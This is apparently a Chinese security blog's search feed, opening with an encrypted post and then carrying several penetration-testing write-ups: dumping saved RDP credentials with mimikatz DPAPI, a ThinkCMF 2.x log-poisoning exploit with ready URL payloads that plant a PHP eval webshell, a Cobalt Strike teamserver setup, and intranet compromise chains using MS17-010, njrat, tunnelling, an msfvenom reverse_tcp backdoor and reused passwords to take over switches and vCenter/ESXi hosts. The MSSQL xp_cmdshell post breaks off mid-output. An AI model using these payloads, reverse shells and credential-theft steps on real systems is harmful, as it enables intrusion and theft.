784a339524d11d95af0864e44fee61762480eedcefea201ef1f9a262244efec3bf557cb9afd5e173230cfe35aebfa08761f15c959ccc8293cff278591c75d8ea2047f07a19bd37cf357db8f8e153a63d3a8191d197517057691ccc135939e1ac96ac897df239aca3f136cfd7ec0b4f6d09f844abe018ef1a5e6e68f54c4ef56340a51a1ad2c8b043f05da03e83424e3bd0eacacc4f050bea5ed9f3b0e6aaad3de3c308cc88640845366ac107c7cf52a2377e0126dfcd64e00b41687fbee15690578bf3c58a5d0e829ac8ebf65095bf56d3b039fdf47307a8372bed28236ec0a4d7efe203e42a9951a4d019d41aedc8c08b80c61f559faf0edff699ffccda71efbfbe4ff62cc468fef246f3c50faf8c0be0ab413a75268749468f68cadac14fd32827c7779196025102fb68d379bc89206f2a701f4d16ca5f8b89b13c3df063884824c5f34a1e49d32836cefe2a01e7d15dfd3cbba72d78f01fcb61cce0c90fe1a02cf68a25f822fec5a9c889f046489c22673a2f0127c0df86a25576071db688c851d8e2705b698fd5567caa604b72828bd29980690026480bfeadbb05a24212d8fd2207014e68cf7497d72d53499f1eaf8a93adbe912186bc8994267f1a62338bc82a9d37f94f25d0d091a9fb9f28ed82fdae0910694aea67f6296f4da3a840d8ec0015a06bcd316c52cf91814d7156c5123752ab598c663b8a30114297802e477d262a7fa383c9709bdf21150fce552a00c5017a230e499af01be28418d6516dd00c32918a996745a442091dc57b25549d0ac08fa196ba7cb1af93e5680aa151ddace4f0e82dc4ceffcc6430ce31be374afc30c59362438f12a9e01db0dedd9c3266f9fa72ac69cac2c3f010c2deca1358f7596d5f262b8d05160e53d72230beb00542450774f78dc064557a6f48c73ac380229f57eb91d711c1f021a189f12f8dddcbf2985dc9365468498ea4e8e3d8074fa2c78b4b5b1d7b670694005c382d1747f02fd1434f5dcf806d895b9965b43fe3e9afb2031283444393c1aac8015ec693c59d3f5df22de406d5ab60157d564fecdc6b2e2ee278f10f56a11b89d3143f74545fbf09a296146ccdea19e3e8d4ee1d777523c4d36be5be1457a519a23cbdd9995488e702b778a776174760141b9c3e27a75734b2d3f15f960f77900603f4ea3a187bdd17bd771cd8548477f611cfa32bed32ba1f7c04e1e8e178b1881af6336be4e1d662d25ab9e5c9659e8af601f8f8e71b1c98e2558c07d97dfba9a83a1ea73f2c3840277451ceda507cc265b474510a92031361593ec328b9a1b0677510126d02d88c72195329772e44e8e411fe963de9ea9e33baabc531a7524811ac5b3abcf67ada8c9b5b180110fd8ef76c13fb710d7a570ad3907145106e56ae58118b3a2f1035c575abb7296a6646ef674d0fb269bc5f11a799f932cbcf5ab64bafbebc64aa790f03d1db2b3680dec4c09f0624f7d415123f95169254115984d3d577067f98d657e4a946b04dd4836f5d6c12da8de31ac69d3ec69827168f4e853f66daca0df940dd2ad01641b2865899582748a6851d7553ec8927e0e457c1d34afaf04ef621a1a39b33efa148d55a209ba8ad6c8a6363e48bffc2b6160afdfc1a6a98b841faf834a8d1f879f4ed96810c911957e69cf712ac8b322796223ab7b2cbfa0165c2399a2bfc7f363530620e00cf2553abca0ac064906853a80e93e3a1ef2d3f426155857d2a47e06b52744a7276c652dc9ed7d216639065b8105419b32f164eabaedb99f27839009cdcd3074fe1d55cff93b1cee13d727493e9824766e3839401be1705f35253d96a45453a5d2224449c1751166ebdf7718dd84ae3baea5a0649c292ed849b6867a666c2104078ec62f68c790654688f1fcf28606746cb5e38209f0e8ef5be199ab40974c3fdfd1dbebaede4bf252ef59c74b22ef73c3dd8cbe7a3539d501165b0226269cf57eef84e607595b2cdcaf52f8147b573c2cea8a1d5ea04a47e44ce5f00d0eb1aeafcf152e3fdc949e354b0e440cde3a8ba17d132e999f1c934edd43dd9ad20ff0578e40082ca998c20bfa8fe168085828a6e7f4cbd78dbdc87e25d954bed900f4c72c7dee90596cf75b944cf6eacc6fe1a5c3a188ce8bcb34f3a05892ef0b6533b43d4e204e5d0ff788d7417d585430ee7ecd37a7495e059fd4b2513a20805cb16d641989d290f872d0bb05ec9656ca98d9cadd8fad41217dc1b0a727634e26444099821ed54afaf4031e0111a0780db4ae4bb829452492d86d7f6470ff19ac50481b360cca9bb8e0ad555e95cd1085c463eed6df6650112b44b872ffbcf27a389a067211b47d200f3f42f8b96c8c3eb994fb3367dd7178162cdd7f2a2c419fca6d974b7ca8bdd2afb1aa978d5aa5e76243a289e001a65c897d467ce492b8ea4bf76142785d5be86262d5e5ee38246e17d226c9cc6d69fe659d86f23aad43cfdafe6c889373f6cce2b0968b8febdb03634de9294723ecca5f7e770fb3cdad70831a717a6007ec459864069992245c4707839e0c8f6f7236298c82fd1e889f3bbff1c812b3204c00f3143015d7e7b87a29ec888728a7eaffabc77233277e3d7c1d28726c727f14aada1764853075068377fc5051b67529f7428cbabe53e394cd2d44a651a0b411dff66a5b30444b4a5696e4a6e4b6b10ca03873d02707e73ef59ceaf38a8913fd650a89f2b0cf9563790f9f24f662140d36fe4b793fe9e0544799b139bedd1c53d9280b0b8945e8a822015bce5d2164d8501b93af36679e608c9bb1ddeff8d972dd5712b5359d5c79f6fe7fff54da8d3d62e78b06edeef034ba7fb3f729d34e33b39b392b414754375e8e9d756b58133d61fe7d13efa143580b0347ca3ad80273d0e8531ca7800bc9c22bc3e218e8d663420aa7cfb7da1a489adab1e46ea086e5dff833b03d2c0b46e69be866a507bdb11a41f32e3a81467517666b4936968b0ca123951f902746c6468e1b49edc8a72e06b97f7bf65f16f809289d4b961bbac9fce202ea2c1a3911092e24585fd8d56b2aba2d0383d57102e25e61f441da4e84917ba7c0712d7e91fe4963520cb7f3878e9ff899cc363f2d4304db73efbeaf77ca5ede19fa08a9746befd05dde28cf3c8834ca5a659ea179be0907a163c5e04e9171c62ab1a207e889bf6057431d6380e1e6b5420be709a91723eac93333d8e30db83b976db6deca60aa75679461216d89018bf28ab921462670b58fa9bb145e7d838f1e9fa245e7041fe8141acf87249344a1e5af4ddf06d37241f58baf49bcb14b5dcfbf4e818c691cb384f72485992b077e916d4247331a3a5871f552ac5cec81ba04618770c2202bdea75dd7611411226b2fc3a890935b93826947f0bc65ab16bc1e952116d35360bd74462fc154fe8f632e5ab7c55e581d7adf1d17383af6c37e4141574e492ab0e3a54a1231357d3135d00c8cb0eff87f818e29dbe21ea8186d1e3774fd3bebd949605f3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> VulCMS </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取远程主机保存的RDP凭据密码</title>
      <link href="/p/bf1f.html"/>
      <url>/p/bf1f.html</url>
      
        <content type="html"><![CDATA[<p>拿下一台运维机，上了个CS，发现曾经连接过几台服务器并且保存了凭据，网上查了圈发现CS不支持交互式mimikatz，记录下获取远程主机RDP凭据。</p><span id="more"></span><p>Windows保存RDP凭据的目录是<code>C:\Users\用户名\AppData\Local\Microsoft\Credentials</code></p><p>可通过命令行获取，执行: <code>cmdkey /list</code>或<code>powerpick Get-ChildItem C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\ -Force</code><br><strong>注意:<code>cmdkey /list</code>命令务必在Session会话下执行，system下执行无结果。</strong></p><p><img src="/images/image-20200113145947805.png" alt="image-20200113145947805"></p><p>使用<code>cobalt strike</code>中的<code>mimikatz</code>可以获取一部分接下来要用到的<code>masterkey</code>和<code>pbData</code></p><p><code>mimikatz dpapi::cred /in:C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\SESSIONID</code></p><p>输出应类似</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**BLOB**</span><br><span class="line">  dwVersion          : 00000001 - 1</span><br><span class="line">  guidProvider       : &#123;df9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;</span><br><span class="line">  dwMasterKeyVersion : 00000001 - 1</span><br><span class="line">  guidMasterKey      : &#123;0785cf41-0f53-4be7-bc8b-6cb33b4bb102&#125;</span><br><span class="line">  dwFlags            : 20000000 - 536870912 (system ; )</span><br><span class="line">  dwDescriptionLen   : 00000012 - 18</span><br><span class="line">  szDescription      : 本地凭据数据</span><br><span class="line"></span><br><span class="line">  algCrypt           : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">  dwAlgCryptLen      : 00000100 - 256</span><br><span class="line">  dwSaltLen          : 00000020 - 32</span><br><span class="line">  pbSalt             : 726d845b8a4eba29875****10659ec2d5e210a48f</span><br><span class="line">  dwHmacKeyLen       : 00000000 - 0</span><br><span class="line">  pbHmackKey         : </span><br><span class="line">  algHash            : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">  dwAlgHashLen       : 00000200 - 512</span><br><span class="line">  dwHmac2KeyLen      : 00000020 - 32</span><br><span class="line">  pbHmack2Key        : cda4760ed3fb1c7874****28973f5b5b403fe31f233</span><br><span class="line">  dwDataLen          : 000000c0 - 192</span><br><span class="line">  pbData             : d268f81c64a3867cd7e96d99578295ea55a47fcaad5f7dd6678989117fc565906cc5a8bfd37137171302b34611ba5****e0b94ae399f9883cf80050f0972693d72b35a9a90918a06d</span><br><span class="line">  dwSignLen          : 00000040 - 64</span><br><span class="line">  pbSign             : 63239d3169c99fd82404c0e230****37504cfa332bea4dca0655</span><br></pre></td></tr></table></figure><p>需要关注的是<code>guidMasterKey</code>、<code>pbData</code>，<code>pbData</code>是我们要解密的数据，<code>guidMasterKey</code>是解密所需要的密钥。这里LSASS已经在其缓存中存有这个<code>key </code>因此我们可以使用<code>SeDebugPrivilege</code>获取。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; mimikatz !sekurlsa::dpapi  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz !sekurlsa::dpapi  </span><br><span class="line"></span><br><span class="line">[00000001]</span><br><span class="line">* GUID      :&#123;0785cf41-0f53-4be7-bc8b-6cb33b4bb102&#125;</span><br><span class="line">* Time      :2020/1/3 8:05:02</span><br><span class="line">* MasterKey :02b598c2252fa5d8f7fcd***7737644186223f44cb7d958148</span><br><span class="line">* sha1(key) :3e6dc57a0fe****a902cfaf617b1322</span><br><span class="line">[00000002]</span><br><span class="line">* GUID      :&#123;edcb491a-91d7-4d98-a714-8bc60254179f&#125;</span><br><span class="line">* Time      :2020/1/3 8:05:02</span><br><span class="line">* MasterKey :c17a4aa87e9848e9f46c8ca81330***79381103f4137d3d97fe202</span><br><span class="line">* sha1(key) :5e1b3eb1152d3****6d3d6f90aaeb</span><br></pre></td></tr></table></figure><p>然后将凭据保存到本地，执行</p><p><code>mimikatz &quot;dpapi::cred /in:C:\Users\USERNAME\Desktop\test\SESSION /masterkey:对应的GUID key&quot;</code></p><p><img src="/images/image-20200113151254629.png" alt="image-20200113151254629"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkCMF缓存getshell</title>
      <link href="/p/7506.html"/>
      <url>/p/7506.html</url>
      
        <content type="html"><![CDATA[<p>前一阵子接到个项目，目标站是<code>thinkCMF2.X</code>搭建的，试过网上很多方法无法拿下，本地搭了个环境测试了下，最终成功拿下</p><span id="more"></span><p>由于<code>thinkcmf2.x</code>使用了<code>thinkphp3.x</code>作为开发框架，默认情况下启用了报错日志并且开启了模板缓存，导致可以使用加载一个不存在的模板来将生成一句话的<code>PHP</code>代码写入<code>data/runtime/Logs/Portal</code>目录下的日志文件中，再次包含该日志文件即可在网站根目录下生成一句话木马<code>m.php</code></p><p>日志文件格式为<code>YY_MM_DD.log</code>，如当前日期为2019年12月12日，日志文件为<code>19_12_12.log</code>，完整路径为<code>data/runtime/Logs/Portal/19_12_12.log</code></p><h2 id="测试成功的环境"><a href="#测试成功的环境" class="headerlink" title="测试成功的环境"></a>测试成功的环境</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li>宝塔[PHP7.2]</li></ul><h3 id="Windwos"><a href="#Windwos" class="headerlink" title="Windwos"></a>Windwos</h3><ul><li>PHPstudy PHP7.1</li></ul><h3 id="Payload1："><a href="#Payload1：" class="headerlink" title="Payload1："></a>Payload1：</h3><p>首先访问<code>http://target.domain/?a=display&amp;templateFile=%3C?php%20file_put_contents(%27m.php%27,%27%3C%3fphp+eval($_POST[%22X%22])%3b%3F%3E%27);die();?%3E</code></p><p><img src="/images/image-20200110232754375.png" alt="image-20200110232754375"></p><p>然后请求<code>http://target.domain/?a=display&amp;templateFile=data/runtime/Logs/Portal/YY_MM_DD.log</code></p><p><img src="/images/image-20200110232929112.png" alt="image-20200110232929112"></p><p>即可在<code>http://target.domain/</code>根目录生成<code>m.php</code>，密码是X</p><p><img src="/images/image-20200110233013338.png" alt="image-20200110233013338"></p><h3 id="Payload2"><a href="#Payload2" class="headerlink" title="Payload2:"></a>Payload2:</h3><p>首先访问<code>http://target.domain/?a=display&amp;templateFile=%3C%3F%70%68%70%20%65%76%61%6C%28%24%5F%50%4F%53%54%5BX%5D%29%3B%3F%3E</code></p><p>然后菜刀连接<code>http://target.domain/?a=display&amp;templateFile=data/runtime/Logs/Portal/YY_MM_DD.log</code>，密码同样是X</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 日常 </tag>
            
            <tag> VulCMS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike Teamserer的搭建</title>
      <link href="/p/eeb3.html"/>
      <url>/p/eeb3.html</url>
      
        <content type="html"><![CDATA[<p>记录下Cobalt Strike Teamserer的搭建</p><span id="more"></span><blockquote><p>环境如下</p><ul><li>Ubuntu 18.04</li><li>Cobalt Strike 3.14</li></ul></blockquote><p>准备一台Ubuntu 18.04的服务器，下载<code>Cobalt Strike</code>完整文件并传到服务器上</p><p><img src="/images/1572710470217.png" alt="1572710470217"></p><p>安装<code>JDK1.8</code></p><p><code>apt install openjdk-8-jdk  -y</code></p><p>装好后尝试执行<code>./teamserver 10.16.11.55 cSro0t</code>进行验证</p><p><img src="/images/1572710672368.png" alt="1572710672368"></p><p>启动成功</p><h1 id="添加服务"><a href="#添加服务" class="headerlink" title="添加服务"></a>添加服务</h1><p><code>vi /etc/systemd/system/cobaltstrike.service</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=CS Service</span><br><span class="line">After=network.target</span><br><span class="line">Wants=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">PIDFile=/run/CS.pid</span><br><span class="line">WorkingDirectory=/path_to_cobaltstrike_root_directory/</span><br><span class="line">ExecStart=/path_to_cobaltstrike_root_directory/teamserver YOUR_SERVER_IP YOUR_PASSWORD</span><br><span class="line">Restart=on-failure</span><br><span class="line"># Don&#x27;t restart in the case of configuration error</span><br><span class="line">RestartPreventExitStatus=23</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>启用服务并查看状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl start cobaltstrike</span><br><span class="line">systemctl status cobaltstrike.service</span><br></pre></td></tr></table></figure><p><img src="/images/1572710927211.png" alt="1572710927211"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复盘从一个监控主机到核心路由沦陷</title>
      <link href="/p/aac0.html"/>
      <url>/p/aac0.html</url>
      
        <content type="html"><![CDATA[<p>在对内网进行<code>ms17-010</code>扫描时，发现2台之前没有出现过且没有打补丁的主机，于是，尝试了一波</p><span id="more"></span><p>kali主机在扫描时发现2台之前没有出现过且没有打补丁的主机</p><p><img src="/images/1570723715159.png" alt="1570723715159"></p><p>尝试打了一波</p><p><img src="/images/1570723899385.png" alt="1570723899385"></p><p>然后种了个<code>njrat</code></p><p><img src="/images/1570725845893.png" alt="1570725845893"></p><p>翻文件的时候发现了点配置文件</p><p><img src="/images/1570724083033.png" alt="1570724083033"></p><p><code>down</code>下来解压后发现是交换机的配置文件，于是有了一个大胆的想法</p><p><img src="/images/1570724161870.png" alt="1570724161870"></p><p>查看了被控主机的网络连接后，发现一个地址无法<code>ping</code>通，<code>TCP</code>包也无法到达，推测做了<code>ACL</code></p><p><img src="/images/1570724333653.png" alt="1570724333653"></p><p>于是在被控机上搭了<code>earthworm</code>做转发</p><blockquote><p>本机执行<code>ew -s rcsocks -l 本地代理端口 -e 远端连接端口 </code></p><p>被控机执行<code>ew -s rssocks -d 主控机IP -e 远端连接端口 </code></p></blockquote><p><img src="/images/1570724558982.png" alt="1570724558982"></p><p>然后开启<code>proxifier</code>的代理功能，成功访问了那个系统，但这不是主要目的</p><p><img src="/images/1570724652145.png" alt="1570724652145"></p><p>在咨询了好哥们后，他建议尝试搞搞交换机看看</p><p>在对<code>10.2.66/24</code>网段扫描后发现<code>10.2.66.254</code>开放了<code>80</code>和<code>23</code>端口，尝试<code>xshell</code>连接</p><p><img src="/images/1570724812791.png" alt="1570724812791"></p><p>成功使用<code>huawei</code>密码<code>huawei@1234</code>连接，继续翻上级路由</p><p><img src="/images/1570724864331.png" alt="1570724864331"></p><p><img src="/images/1570724926806.png" alt="1570724926806"></p><p>发现了<code>10.2.20.1</code></p><p>继续<code>telnet</code></p><p><img src="/images/1570724968457.png" alt="1570724968457"></p><p>继续翻</p><p><img src="/images/1570725016714.png" alt="1570725016714"></p><p>发现10.2.20.58</p><p><img src="/images/1570725071124.png" alt="1570725071124"></p><p>继续翻，翻到10.4.0.1</p><p><img src="/images/1570725139216.png" alt="1570725139216"></p><p>继续telnet</p><p><img src="/images/1570725188260.png" alt="1570725188260"></p><p>另外发现此时可以ping通10.4.0.1这台交换机</p><p><img src="/images/1570725560354.png" alt="1570725560354"></p><p>于是乎，扔浏览器打开看看</p><p><img src="/images/1570725700017.png" alt="1570725700017"></p><p><img src="/images/1570725725357.png" alt="1570725725357"></p><p>拿下后将本次收集到的密码与巡风扫描到的telnet主机进行爆破后发现了更多的交换机。。。。。。</p><p><img src="/images/1570725809593.png" alt="1570725809593"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透</title>
      <link href="/p/69e0.html"/>
      <url>/p/69e0.html</url>
      
        <content type="html"><![CDATA[<p>在上次拿下了一台内网主机后，将其作为跳板，对<code>192.168/16</code>网段进行了扫描</p><span id="more"></span><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>先上一张内网环境拓扑图</p><p><img src="/images/1568903322779.png" alt="1568903322779"></p><p>经过扫描后，识别出几个重要资产，并将他们作为目标进行针对性的测试</p><blockquote><p>192.168.122.8<br>192.168.122.11<br>192.168.122.12<br>192.168.122.13<br>192.168.122.15<br>192.168.122.16<br>192.168.122.54<br>192.168.122.60</p></blockquote><p><img src="/images/1568901397651.png" alt="1568901397651"></p><p>通过<code>banner</code>和<code>80</code>端口<code>title</code></p><p>识别到的资产如下</p><p><code>192.168.101.3</code>-&gt;锐捷交换机</p><p><img src="/images/1568901498643.png" alt="1568901498643"></p><p><code>192.168.135.1</code>-&gt;锐捷AC控制器，下联5个AP</p><p><img src="/images/1568901527565.png" alt="1568901527565"></p><p><code>192.168.122.8</code>-&gt;VMware vCenter主机</p><p><img src="/images/1568901579163.png" alt="1568901579163"></p><p><code>192.168.122.6</code>-&gt; ESXi主机</p><p><img src="/images/1568903430349.png" alt="1568903430349"></p><p>内网大杀器<code>MS17-010</code>的扫描结果</p><p><img src="/images/1568901642587.png" alt="1568901642587"></p><p><code>攻击路径：10.46.1.16=192.168.122.16-&gt;192.168.122.11-&gt;192.168.122.15-&gt;192.168.122.54-&gt;192.168.122.60-&gt;192.168.122.8-&gt;192.168.122.6</code></p><h1 id="攻击路径"><a href="#攻击路径" class="headerlink" title="攻击路径"></a>攻击路径</h1><h2 id="10-46-1-16"><a href="#10-46-1-16" class="headerlink" title="10.46.1.16"></a>10.46.1.16</h2><p>MSSQL弱口令+IIS7web服务无<code>webshell</code>，见上一篇博客</p><h2 id="192-168-122-16-gt-192-168-122-11"><a href="#192-168-122-16-gt-192-168-122-11" class="headerlink" title="192.168.122.16-&gt;192.168.122.11"></a>192.168.122.16-&gt;192.168.122.11</h2><p>使用自行创建的管理员权限的<code>asp.net</code>账户登录后，运行<code>mimikatz</code>抓到了<code>administrator</code>用户的密码</p><p><img src="/images/1568903727776.png" alt="1568903727776"></p><p>然后使用<code>administrator</code>用户登录<code>192.168.122.16</code>，发现在<code>mstsc</code>中有<code>192.168.122.11</code>的历史连接记录并且保存了帐号密码，连接上后发现是<code>administrator</code>用户，再次抓取<code>192.168.122.11</code>密码，发现密码与<code>.16</code>的一样，并且在桌面发现了数据库连接密码，保存备用</p><h2 id="192-168-122-11-gt-192-168-122-15"><a href="#192-168-122-11-gt-192-168-122-15" class="headerlink" title="192.168.122.11-&gt;192.168.122.15"></a>192.168.122.11-&gt;192.168.122.15</h2><p>由于内网中已有2台主机密码一样，将密码做成字典后对<code>192.168.122.0/24</code>进行了RDP爆破，发现<code>192.168.122.15</code>的密码也为<code>Dell123456</code>，逐拿下第三台</p><h2 id="192-168-122-15-gt-192-168-122-54-gt-192-168-122-60"><a href="#192-168-122-15-gt-192-168-122-54-gt-192-168-122-60" class="headerlink" title="192.168.122.15-&gt;192.168.122.54-&gt;192.168.122.60"></a>192.168.122.15-&gt;192.168.122.54-&gt;192.168.122.60</h2><p>由于<code>192.168.122.60</code>这台主机存在<code>ms17-010</code>漏洞，MSF的代理隧道不稳定，决定利用BPF中的<code>Eternalblue</code>模块进行攻击，对相关文件进行代理设置后</p><p><img src="/images/1568904161142.png" alt="1568904161142"></p><p>由kali机生成meterpreter木马并设置监听</p><p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.16.11.85  LPORT=4444 -f dll &gt;~/backdoor_x64.dll</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 10.16.11.85</span><br><span class="line">lhost =&gt; 10.16.11.85</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure><p>设置好BPF后，对<code>192.168.122.54</code>进行了攻击并获得了一个<code>system</code>权限的shell</p><p><img src="/images/1568904281983.png" alt="1568904281983"></p><p><img src="/images/1568904349365.png" alt="1568904349365"></p><p>随后使用<code>mimikatz</code>读密码</p><p><img src="/images/1568904374468.png" alt="1568904374468"></p><p><img src="/images/1568904407381.png" alt="1568904407381"></p><p>得到密码为<code>Admin@123</code>，同样的方法对<code>192.168.122.60</code>进行了攻击，密码一样为<code>Admin@123</code>，同时check出这两台机器为虚拟机</p><p><img src="/images/1568904525836.png" alt="1568904525836"></p><p>由于内网中存在2台虚拟机管理系统，逐将密码保存备用</p><h2 id="192-168-122-60-gt-192-168-122-8-gt-192-168-122-6"><a href="#192-168-122-60-gt-192-168-122-8-gt-192-168-122-6" class="headerlink" title="192.168.122.60-&gt;192.168.122.8-&gt;192.168.122.6"></a>192.168.122.60-&gt;192.168.122.8-&gt;192.168.122.6</h2><p>通过之前的密码分析，推断出管理员有喜爱使用同一密码的爱好，于是大胆猜测vCenter主机的密码也为<code>Admin@123</code>，登录后确实如此</p><p><img src="/images/1568904853069.png" alt="1568904853069"></p><p>由于本人之前部署过<code>vCenter</code>和<code>ESXi</code>，其默认用户名为<code>administrator@vsphere.local</code>和<code>root</code>，尝试使用<code>Admin@123</code>登录后，两台主机（或者说一台）沦陷</p><p><img src="/images/1568904990106.png" alt="1568904990106"></p><p><img src="/images/1568905005051.png" alt="1568905005051"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mssql无webshell提权</title>
      <link href="/p/3092.html"/>
      <url>/p/3092.html</url>
      
        <content type="html"><![CDATA[<p>在内网中扫描到了几台<code>sa</code>权限的<code>mssql</code>，报备后做了次简单的检测</p><span id="more"></span><h1 id="侦查"><a href="#侦查" class="headerlink" title="侦查"></a>侦查</h1><p><code>Navicat</code>连上后查看<code>xp_cdshell</code>是否存在</p><p><img src="/images/1568596792031.png" alt="1568596792031"></p><p>发现存在的</p><p>执行<code>exec master..xp_cmdshell &quot;systeminfo&quot;</code>发现网卡连接了一个<code>192.168/16</code>的内网<code>IP</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">主机名:           WIN-XXXXX</span><br><span class="line">OS 名称:          Microsoft Windows Server 2008 R2 Enterprise </span><br><span class="line">OS 版本:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          独立服务器</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     Windows 用户</span><br><span class="line">注册的组织:       </span><br><span class="line">产品 ID:          00486-001-0001076-84214</span><br><span class="line">初始安装日期:     2016/7/29, 17:27:35</span><br><span class="line">系统启动时间:     2019/8/30, 8:37:41</span><br><span class="line">系统制造商:       Inspur</span><br><span class="line">系统型号:         NF5270M4</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 2 个处理器。</span><br><span class="line">                  [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~1197 Mhz</span><br><span class="line">                  [02]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~1197 Mhz</span><br><span class="line">BIOS 版本:        American Megatrends Inc. 4.1.10, 2016/6/1</span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     32,648 MB</span><br><span class="line">可用的物理内存:   28,163 MB</span><br><span class="line">虚拟内存: 最大值: 65,294 MB</span><br><span class="line">虚拟内存: 可用:   60,327 MB</span><br><span class="line">虚拟内存: 使用中: 4,967 MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">登录服务器:       暂缺</span><br><span class="line">修补程序:         安装了 2 个修补程序。</span><br><span class="line">                  [01]: KB4012212</span><br><span class="line">                  [02]: KB976902</span><br><span class="line">网卡:             安装了 2 个 NIC。</span><br><span class="line">                  [01]: Intel(R) I350 Gigabit Network Connection</span><br><span class="line">                      连接名:      本地连接</span><br><span class="line">                      启用 DHCP:   否</span><br><span class="line">                      IP 地址</span><br><span class="line">                        [01]: 192.168.122.16</span><br><span class="line">                        [02]: fe80::e436:8d88:315b:25aa</span><br><span class="line">                  [02]: Intel(R) I350 Gigabit Network Connection</span><br><span class="line">                      连接名:      本地连接 2</span><br><span class="line">                      状态:        媒体连接已中断</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>exec master..xp_cmdshell &quot;ipconfig&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以太网适配器 本地连接 2:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line"></span><br><span class="line">以太网适配器 本地连接:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::e436:8d88:315b:25aa%11</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 192.168.122.16</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 192.168.122.254</span><br><span class="line"></span><br><span class="line">隧道适配器 isatap.&#123;9520CC43-69D2-42A5-99EB-2A1A49B84B34&#125;:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开</span><br><span class="line">   连接特定的 DNS 后缀 . . 